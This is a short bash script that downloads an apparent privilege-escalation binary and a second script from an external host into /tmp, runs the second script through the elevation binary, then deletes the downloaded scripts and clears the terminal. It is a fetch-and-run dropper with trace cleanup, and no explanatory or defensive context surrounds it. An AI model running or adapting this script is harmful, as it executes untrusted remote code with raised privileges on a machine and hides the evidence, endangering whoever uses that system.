#!/usr/bin/env bash

# You can't set variables in this file. Each line is executed independently.
# That's one of the reasons enact.sh needs to be separate.
curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
chmod +x /tmp/elevate.out /tmp/enact.sh

/tmp/elevate.out <<EOF
/tmp/enact.sh
EOF

rm -f /tmp/*.sh

clear
